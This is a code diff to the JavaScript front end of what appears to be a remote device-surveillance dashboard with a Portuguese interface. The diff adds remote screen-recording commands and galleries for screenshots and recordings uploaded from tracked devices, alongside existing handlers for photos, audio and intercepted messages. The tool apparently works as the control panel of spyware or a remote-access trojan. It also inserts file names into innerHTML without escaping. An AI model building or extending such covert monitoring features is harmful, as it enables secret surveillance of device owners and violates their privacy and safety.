@@ -827,6 +827,30 @@ function handleJsonMessage(data) {
             }
             break;
 
+        case 'SCREENSHOT_UPLOADED':
+            logToConsole(`📸 Novo print de tela recebido!`, 'success');
+            if (data.deviceId === currentDeviceId) {
+                fetchMediaList(currentDeviceId);
+            }
+            break;
+
+        case 'SCREEN_RECORD_UPLOADED':
+            logToConsole(`⏺ Nova gravação de tela recebida!`, 'success');
+            if (data.deviceId === currentDeviceId) {
+                fetchMediaList(currentDeviceId);
+            }
+            break;
+
+        case 'SCREEN_RECORD_STARTED':
+            logToConsole(`⏺ Gravação de tela iniciada (${data.duration}s)...`, 'system');
+            setScreenRecordingUI(true);
+            break;
+
+        case 'SCREEN_RECORD_STOPPED':
+            logToConsole(`⏹ Gravação de tela encerrada — aguardando upload...`, 'system');
+            setScreenRecordingUI(false);
+            break;
+
         case 'NEW_MESSAGE':
             if (data.deviceId === currentDeviceId) {
                 const wasAlreadySeen = data.id != null && waSeenIds.has(data.id);
@@ -1659,6 +1683,8 @@ function fetchMediaList(deviceId) {
             renderPhotos(deviceId, data.photos || []);
             renderAudios(deviceId, data.audio || []);
             renderSentAudios(deviceId);
+            renderScreenshots(deviceId, data.screenshots || []);
+            renderScreenRecordings(deviceId, data.screenRecordings || []);
         })
         .catch(err => console.error('Error fetching media list:', err));
 }
@@ -1897,6 +1923,93 @@ function stopLocalScreenUI() {
     if (btn) { btn.classList.remove('btn-danger'); btn.classList.add('btn-secondary'); }
 
     if (currentStreamObjectUrl) { URL.revokeObjectURL(currentStreamObjectUrl); currentStreamObjectUrl = null; }
+}
+
+// ─── Screen Recording ─────────────────────────────────────────────────────────
+let isScreenRecording = false;
+
+function toggleScreenRecord() {
+    if (isScreenRecording) {
+        sendCommand('STOP_SCREEN_RECORD', {});
+        setScreenRecordingUI(false);
+    } else {
+        sendCommand('START_SCREEN_RECORD', { duration: 60 });
+        setScreenRecordingUI(true);
+    }
+}
+
+function setScreenRecordingUI(active) {
+    isScreenRecording = active;
+    const btn  = document.getElementById('sc-record-btn');
+    const icon = document.getElementById('sc-record-icon');
+    if (!btn || !icon) return;
+    if (active) {
+        icon.className = 'fa-solid fa-stop fa-beat';
+        icon.style.color = '#ff3838';
+        btn.title = 'Parar gravação';
+    } else {
+        icon.className = 'fa-solid fa-circle-dot';
+        icon.style.color = 'var(--neon-pink)';
+        btn.title = 'Gravar tela';
+    }
+}
+
+// ─── Screenshots Gallery ───────────────────────────────────────────────────────
+function renderScreenshots(deviceId, screenshots) {
+    const gallery = document.getElementById('screenshots-gallery');
+    if (!gallery) return;
+    if (screenshots.length === 0) {
+        gallery.innerHTML = '<div class="empty-gallery-msg">Nenhum print capturado ainda.</div>';
+        return;
+    }
+    gallery.innerHTML = '';
+    // Populate for modal navigation (reuse pmPhotos flow — shown alongside camera photos)
+    const ssPhotos = screenshots.map(item => {
+        const fileName = item.name || item;
+        const url      = item.url || `/uploads/${deviceId}/screenshots/${fileName}`;
+        const tsMatch  = fileName.match(/screenshot_(\d+)\.jpg/);
+        const ts       = tsMatch ? new Date(parseInt(tsMatch[1])).toLocaleString('pt-BR') : fileName;
+        return { url, caption: `Print — ${ts}` };
+    });
+    ssPhotos.forEach((p, idx) => {
+        const div = document.createElement('div');
+        div.className = 'photo-item';
+        div.innerHTML = `<img src="${p.url}" alt="Print ${idx + 1}" loading="lazy">
+            <div class="photo-caption">${p.caption}</div>`;
+        div.onclick = () => { pmPhotos = ssPhotos; pmIndex = idx; openPhotoModal(idx); };
+        gallery.appendChild(div);
+    });
+}
+
+// ─── Screen Recordings List ────────────────────────────────────────────────────
+function renderScreenRecordings(deviceId, recordings) {
+    const list = document.getElementById('screen-recordings-list');
+    if (!list) return;
+    if (recordings.length === 0) {
+        list.innerHTML = '<div class="empty-audio-msg">Nenhuma gravação de tela ainda.</div>';
+        return;
+    }
+    list.innerHTML = '';
+    [...recordings].forEach(item => {
+        const fileName = item.name || item;
+        const url      = item.url || `/uploads/${deviceId}/screen-recordings/${fileName}`;
+        const tsMatch  = fileName.match(/screen_record_(\d+)\.mp4/);
+        const ts       = tsMatch ? new Date(parseInt(tsMatch[1])).toLocaleString('pt-BR') : fileName;
+        const div = document.createElement('div');
+        div.className = 'audio-item';
+        div.innerHTML = `
+            <div class="audio-info">
+                <i class="fa-solid fa-film" style="color:var(--neon-pink)"></i>
+                <div class="audio-meta">
+                    <span class="audio-name">Gravação de Tela</span>
+                    <span class="audio-time">${ts}</span>
+                </div>
+            </div>
+            <video controls style="width:100%;max-height:200px;border-radius:8px;margin-top:8px;background:#000" preload="metadata">
+                <source src="${url}" type="video/mp4">
+            </video>`;
+        list.appendChild(div);
+    });
 }
 
 // Log formatting for terminal window
